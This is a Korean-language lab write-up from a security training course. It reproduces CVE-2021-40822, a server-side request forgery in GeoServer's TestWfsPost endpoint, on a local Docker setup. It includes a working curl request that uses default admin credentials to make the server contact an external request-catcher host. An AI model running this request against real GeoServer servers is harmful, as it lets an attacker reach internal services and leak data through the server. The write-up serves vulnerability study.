# CVE-2021-40822 (GeoServer SSRF)

> 화이트햇 스쿨 3기 - [이진석]

<br/>

### 요약

- GeoServer는 지리공간 데이터를 보고, 편집하고, 공유할 수 있는 기능을 제공하는 Java로 작성된 오픈 소스 소프트웨어 서버이다.
- GeoServer 2.19.3, 2.18.5, 2.17.6 이전 버전에는 WMS GetMap 요청에 서버 측 요청 위조(SSRF) 취약점이 존재하여 공격자는 GeoServer 서버를 통해 내부 또는 외부 서비스에 요청을 보낼 수 있다.

### 환경구성
- `docker compose up -d` 커맨드를 입력해 GeoServer 2.19.1 서버를 시작한다.
서버가 시작된 후 GeoServer의 기본 페이지를 찾아볼 수 있다. `http://your-ip:8080/geoserver`
<img width="500" alt="서버기본이미지" src="/0.png"/>

- https://requestcatcher.com/ 또는 https://webhook.site/ 에서 공격을 받을 외부 사이트를 준비한다.
  
### exploit
- 취약점은 TestWfsPost엔드포인트에 존재하여 공격자는 이 url매개변수를 사용하여 서버가 임의의 URL로 요청을 보내도록 할 수 있다.
- 엔드포인트는 다음과 같은 여러 매개변수를 허용한다.
url: GeoServer가 요청을 보낼 대상 URL
body: 전송할 요청 본문으로 이 매개변수가 비어 있으면 GeoServer는 GET 요청을 전송하고, 값이 포함되어 있으면 GeoServer는 POST 요청을 전송한다.
username: 기본 인증을 위한 사용자 이름(선택 사항)
password: 기본 인증을 위한 비밀번호 (선택 사항)

<pre><code>curl -X POST http://127.0.0.1:8080/geoserver/TestWfsPost
  -H "Content-Type: application/x-www-form-urlencoded"        
  -H "Host: (your-name).requestcatcher.com"       
  -d "url=http://(your-name).requestcatcher.com/geoserver/../&body=test&username=admin&password=geoserver"</code></pre> 
  
`참고: 매개변수의 호스트는 요청의 헤더 url와 일치해야 합니다 . 그렇지 않으면 GeoServer에서 오류가 반환됩니다.`
<img width="993" alt="결과이미지" src="/1.png" />

<br/>

### 결과
GeoServer를 향한 요청에 대한 응답으로 외부사이트에 로그가 남아 GeoServer에서 온 test라는 텍스트가 반환되는 것을 볼 수 있습니다.
<br/>
